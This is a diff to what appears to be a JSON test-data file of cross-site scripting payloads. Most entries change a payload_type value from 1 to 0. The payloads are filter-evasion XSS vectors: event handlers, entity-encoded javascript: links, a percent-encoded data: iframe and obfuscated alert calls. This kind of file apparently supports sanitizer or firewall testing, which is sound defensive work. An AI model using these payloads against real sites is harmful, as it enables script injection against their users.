     "payload_text": "<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<script x> alert(1) </script 1=2",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<form><button formaction=javascript&colon;alert(1)>CLICKME",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT> ",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "(alert)(1)",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "a=alert,a(1)",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "[1].find(alert)",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "top[“al”+”ert”](1)",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "top[/al/.source+/ert/.source](1)",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "al\\u0065rt(1)",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "top[‘al\\145rt’](1)",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "top[‘al\\x65rt’](1)",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "top[8680439..toString(30)](1)",
     "expected_fail": false,
     "valid": true
